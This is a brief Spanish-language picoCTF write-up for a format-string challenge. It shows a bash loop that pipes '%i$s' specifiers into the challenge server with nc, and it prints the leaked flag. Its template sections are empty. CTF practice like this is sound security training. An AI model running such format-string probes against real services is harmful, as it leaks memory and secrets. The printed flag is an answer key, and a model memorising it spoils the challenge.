## Descripción
Story telling class 1/2

I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/92/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/92/vuln.c). And connect with it using:

## Solución
En esta situación necesitamos obtener podemos obtener los caracteres indicando la posición del caractér que queremos obtener.

podemos utilizar %i$s, donde i es el idex de la posición.


```bash
alberto@Nova:~/Descargas$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 56740 | grep -Ei ctf; done
CTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}
```

## Notas Adicionales
|comando|descripcion|
|---|---|
|xx|xx|

## Referencias
- []()
